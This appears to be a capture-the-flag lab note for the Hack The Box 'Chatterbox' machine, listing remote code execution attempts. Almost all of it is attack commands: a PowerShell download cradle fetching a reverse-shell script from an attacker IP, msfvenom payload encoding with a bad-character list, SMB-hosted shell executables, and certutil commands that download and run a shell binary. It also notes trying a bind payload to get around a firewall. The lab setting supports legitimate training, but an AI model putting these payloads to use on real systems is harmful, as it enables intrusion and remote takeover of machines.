# Unsuccessful RCE attempts

echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.29/rshell.ps1') | powershell -noprofile -

```
root@Kali:~/HTB/Chatterbox# cat ps.cmd 
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.29/rshell.ps1') | powershell -noprofile -

root@Kali:~/HTB/Chatterbox# cat ps.cmd | msfvenom -a x64 --platform Windows -e powershell/base64 NOEXIT
Attempting to read payload from STDIN...
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of powershell/base64
powershell/base64 succeeded with size 344 (iteration=0)
powershell/base64 chosen with final size 344
Payload size: 344 bytes
powershell.exe -W Hidden -nop -ep bypass -NoExit -E ZQBjAGgAbwAgAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAyADkALwByAHMAaABlAGwAbAAuAHAAcwAxACcAKQAgAHwAIABwAG8AdwBlAHIAcwBoAGUAbABsACAALQBuAG8AcAByAG8AZgBpAGwAZQAgAC0ACgA=

root@Kali:~/HTB/Chatterbox# msfvenom -a x86 --platform Windows -p windows/exec CMD='powershell.exe -E ZQBjAGgAbwAgAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAyADkALwByAHMAaABlAGwAbAAuAHAAcwAxACcAKQAgAHwAIABwAG8AdwBlAHIAcwBoAGUAbABsACAALQBuAG8AcAByAG8AZgBpAGwAZQAgAC0ACgA=' -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

These cmd exec couldn't work too

```
# After encoding to PS base64 and running
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.29/rshell.ps1') | powershell -noprofile -

CMD="cmd.exe /k \\10.10.14.29\chatterbox\shell43.exe"
CMD='dir \\10.10.14.29\chatterbox\shell443.exe'
CMD='start \\10.10.14.29\chatterbox\shell443.exe'
CMD='copy \\10.10.14.29\chatterbox\shell443.exe .'
```

These could

```
CMD='net view \\10.10.14.29'
CMD='certutil.exe -f -split -urlcache http://10.10.14.29/shell443.exe'
```

This worked partially (ie. could download but couldn't execute)

```
CMD='certutil.exe -f -split -urlcache http://10.10.14.29/shell443.exe shell.exe & shell.exe'
CMD='cmd /c "certutil -f -split -urlcache http://10.10.14.29/shell443.exe shell.exe & shell.exe"'
```

I also tried switching to bind payload instead of reverse_tcp, in case there was a firewall blocking outward connections but to no avail.